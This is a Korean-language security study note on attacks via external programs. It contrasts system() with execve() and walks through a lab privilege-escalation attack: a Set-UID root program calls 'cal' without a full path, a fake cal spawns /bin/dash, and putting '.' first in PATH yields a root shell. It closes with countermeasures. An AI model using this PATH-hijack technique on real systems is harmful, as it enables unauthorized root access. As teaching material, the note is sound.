## Attacks via External Program 완전 정리

---

### 1. 개념: 외부 프로그램 실행이란?

프로그램이 실행 중에 **다른 프로그램을 호출**하는 경우입니다.

```
내 프로그램(Set-UID) → 외부 프로그램 호출
                              ↑
              여기서 환경변수 공격이 들어올 수 있음!
```

---

### 2. 외부 프로그램 호출 방법 2가지

#### `execve()` 계열

c

```c
execve("/bin/cal", args, env);  // 프로그램을 직접 실행
```

- 쉘을 거치지 않고 **직접** 프로그램 실행
- 환경변수 영향 **거의 없음** → 공격 표면 작음 ✅

#### `system()`

c

```c
system("cal");  // 쉘을 통해 실행
```

내부 호출 흐름:

```
system("cal")
    → execl() 호출
        → execve()로 /bin/sh 실행
            → /bin/sh가 cal 명령어 실행
```

- **쉘을 거치기 때문에** 환경변수(특히 PATH) 영향을 받음
- 공격 표면 **큼** ⚠️

---

### 3. Case Study: PATH 변수 공격

#### 취약한 프로그램 (vul.c)

c

```c
#include <stdlib.h>
int main() {
    system("cal");   // ← 절대 경로 없이 cal 호출!
}
```

**문제:** `cal`을 절대 경로(`/usr/bin/cal`)가 아닌 그냥 `"cal"`로 호출 → PATH 변수로 어디서 찾을지 결정됨

---

#### 공격 준비: 가짜 cal 프로그램 만들기

c

```c
/* cal.c - 악성 "calendar" 프로그램 */
int main() {
    system("/bin/dash");   // root 쉘 실행!
}
```

---

#### 공격 실행 흐름

bash

```bash
# 1. vul을 Set-UID(root) 프로그램으로 만들기
gcc -o vul vul.c
sudo chown root vul
sudo chmod 4755 vul

# 2. 정상 실행 확인 (달력 출력됨)
./vul
→ December 2015 달력 출력

# 3. 가짜 cal 컴파일
gcc -o cal cal.c

# 4. PATH 앞에 현재 디렉토리(.) 추가 ← 핵심!
export PATH=.:$PATH
echo $PATH
→ .:/usr/local/bin:/usr/bin:...
     ↑
     현재 디렉토리가 맨 앞!

# 5. vul 다시 실행
./vul
→ #   ← root 쉘 획득!
# id
→ euid=0(root)  ← root 권한!
```

---

#### 왜 공격이 성공했나?

```
vul이 system("cal") 호출
    → /bin/sh가 "cal"을 PATH에서 탐색
    → PATH = .:/usr/bin:...
    → 현재 디렉토리(.)를 먼저 탐색
    → 내 가짜 cal 발견!
    → 가짜 cal 실행 (vul이 root이므로 root 권한으로!)
    → /bin/dash 실행 → root 쉘 획득
```

---

### 4. Attack Surfaces 비교

|         | `system()` | `execve()` |
| ------- | ---------- | ---------- |
| 쉘 거침    | ✅ 거침       | ❌ 안 거침     |
| PATH 영향 | ✅ 받음       | ❌ 안 받음     |
| 환경변수 영향 | ✅ 받음       | ❌ 안 받음     |
| 공격 표면   | **큼** ⚠️   | **작음** ✅   |

**결론:** Set-UID처럼 권한 있는 프로그램에서 외부 프로그램을 호출할 때는 반드시 `execve()`를 써야 합니다.

---

### 전체 요약

```
공격 조건
1. Set-UID 프로그램이 system()으로 외부 명령 호출
2. 절대 경로가 아닌 그냥 명령어 이름만 사용 (ex: "cal")

공격 방법
→ 가짜 명령어 파일 만들기
→ PATH 앞에 . (현재 디렉토리) 추가
→ Set-UID 프로그램 실행 시 가짜 명령어가 먼저 발견됨
→ root 권한으로 가짜 명령어 실행 → 권한 상승!

대응책
→ system() 대신 execve() 사용
→ 명령어는 항상 절대 경로로 호출 (/usr/bin/cal)
```
